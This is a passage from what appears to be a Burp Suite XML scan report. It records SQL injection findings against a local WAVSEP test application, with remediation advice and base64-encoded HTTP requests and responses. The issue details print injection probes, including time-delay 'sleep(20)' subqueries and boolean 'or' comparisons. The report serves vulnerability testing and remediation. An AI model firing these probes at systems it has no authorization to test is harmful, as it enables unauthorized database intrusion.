      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjA0OjAzIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0MTMNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDMgLSBJbmplY3Rpb24gaW50byBhIHN0cmluZyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHRvIHRyaWdnZXIgY29uZGl0aW9uYWwgdGltZSBkZWxheXMgdG8gaW5mZXIgaW5mb3JtYXRpb24uIEdvYWw6IHJldHJpZXZlICdhZG1pbicgcGFzc3dvcmQgaW5qZWN0aW5nIGluIEdFVCBwYXJhbWV0ZXIuPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>4767633250194866176</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-With200Errors.jsp [orderby parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>orderby</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>'</b> was submitted in the orderby parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>,(select*from(select(sleep(20)))a)</b> was submitted in the orderby parameter. The application took <b>20005</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDUtSW5qZWN0aW9uSW5TZWFyY2hPcmRlckJ5LVN0cmluZy1CaW5hcnlEZWxpYmVyYXRlUnVudGltZUVycm9yLVdpdGgyMDBFcnJvcnMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAxMw0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtMjAwRXJyb3IvQ2FzZTA1LUluamVjdGlvbkluU2VhcmNoT3JkZXJCeS1TdHJpbmctQmluYXJ5RGVsaWJlcmF0ZVJ1bnRpbWVFcnJvci1XaXRoMjAwRXJyb3JzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0Kb3JkZXJieT1tc2dpZCc=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNTM4DQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUyOjE3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDUgLSBJbmplY3Rpb24gaW50byBhbiBvcmRlciBieSBjbGF1c2UgKGFueSB0eXBlKSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpFeGNlcHRpb24gZGV0YWlsczogamF2YS5zcWwuU1FMU3ludGF4RXJyb3JFeGNlcHRpb246IFlvdSBoYXZlIGFuIGVycm9yIGluIHlvdXIgU1FMIHN5bnRheDsgY2hlY2sgdGhlIG1hbnVhbCB0aGF0IGNvcnJlc3BvbmRzIHRvIHlvdXIgTXlTUUwgc2VydmVyIHZlcnNpb24gZm9yIHRoZSByaWdodCBzeW50YXggdG8gdXNlIG5lYXIgJycnIGF0IGxpbmUgMQoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDUtSW5qZWN0aW9uSW5TZWFyY2hPcmRlckJ5LVN0cmluZy1CaW5hcnlEZWxpYmVyYXRlUnVudGltZUVycm9yLVdpdGgyMDBFcnJvcnMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAxMw0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtMjAwRXJyb3IvQ2FzZTA1LUluamVjdGlvbkluU2VhcmNoT3JkZXJCeS1TdHJpbmctQmluYXJ5RGVsaWJlcmF0ZVJ1bnRpbWVFcnJvci1XaXRoMjAwRXJyb3JzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0Kb3JkZXJieT1tc2dpZCUyYyhzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKQ==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUyOjM3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA3MzANCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDUgLSBJbmplY3Rpb24gaW50byBhbiBvcmRlciBieSBjbGF1c2UgKGFueSB0eXBlKSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjEKPC9URD4KPFREPgpXZWxjb21lIHRvIHRoZSB3ZWIgc2l0ZQo8L1REPgo8VEQ+CkhlbGxvIFdvcmxkCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgoyCjwvVEQ+CjxURD4KUmVtZW1iZXIgdG8gY2hhbmdlIHlvdXIgcGFzc3dvcmQKPC9URD4KPFREPgpIZWxsbyBXb3JsZAo8L1REPgo8L1RSPgo8VFI+CjxURD4KMwo8L1REPgo8VEQ+CllvdXIgYWNjb3VudCBpcyBhYm91dCB0byBleHBpcmUKPC9URD4KPFREPgpIZWxsbyBXb3JsZAo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8779749395323565056</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case06-InjectionInView-Numeric-PermissionBypass-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case06-InjectionInView-Numeric-PermissionBypass-With200Errors.jsp [transactionId parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionId</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>'</b> was submitted in the transactionId parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payloads <b>46425547 or 2305=02305</b> and <b>56311249 or 8253=8258</b> were each submitted in the transactionId parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the transactionId parameter. The application took <b>20007</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDYtSW5qZWN0aW9uSW5WaWV3LU51bWVyaWMtUGVybWlzc2lvbkJ5cGFzcy1XaXRoMjAwRXJyb3JzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTUNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTIwMEVycm9yL0Nhc2UwNi1JbmplY3Rpb25JblZpZXctTnVtZXJpYy1QZXJtaXNzaW9uQnlwYXNzLVdpdGgyMDBFcnJvcnMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQp0cmFuc2FjdGlvbklkPTEn]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNTUxDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUyOjE4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNiAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHByaXZhdGUgcmVzb3VyY2UgdmlldyBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpFeGNlcHRpb24gZGV0YWlsczogamF2YS5zcWwuU1FMU3ludGF4RXJyb3JFeGNlcHRpb246IFlvdSBoYXZlIGFuIGVycm9yIGluIHlvdXIgU1FMIHN5bnRheDsgY2hlY2sgdGhlIG1hbnVhbCB0aGF0IGNvcnJlc3BvbmRzIHRvIHlvdXIgTXlTUUwgc2VydmVyIHZlcnNpb24gZm9yIHRoZSByaWdodCBzeW50YXggdG8gdXNlIG5lYXIgJycgQU5EIHVzZXJJZD0xJyBhdCBsaW5lIDEKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDYtSW5qZWN0aW9uSW5WaWV3LU51bWVyaWMtUGVybWlzc2lvbkJ5cGFzcy1XaXRoMjAwRXJyb3JzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTUNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTIwMEVycm9yL0Nhc2UwNi1JbmplY3Rpb25JblZpZXctTnVtZXJpYy1QZXJtaXNzaW9uQnlwYXNzLVdpdGgyMDBFcnJvcnMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQp0cmFuc2FjdGlvbklkPTE0NjQyNTU0NyUyMG9yJTIwMjMwNSUzZDAyMzA1]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUzOjM5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA2MTENCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNiAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHByaXZhdGUgcmVzb3VyY2UgdmlldyBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiB0cmFuc2FjdGlvbnM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbklkCjwvQj4KPC9URD4KPFREPgo8Qj4Kc3VtCjwvQj4KPC9URD4KPFREPgo8Qj4KZGVzY3JpcHRpb24KPC9CPgo8L1REPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbkRhdGUKPC9CPgo8L1REPgo8L1RSPgo8VFI+CjxURD4KMTMyCjwvVEQ+CjxURD4KMTAwMAo8L1REPgo8VEQ+ClNpbXBsZSBUcmFuc2FjdGlvbgo8L1REPgo8VEQ+CjIwMTAtMDEtMDEKPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDYtSW5qZWN0aW9uSW5WaWV3LU51bWVyaWMtUGVybWlzc2lvbkJ5cGFzcy1XaXRoMjAwRXJyb3JzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTUNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24v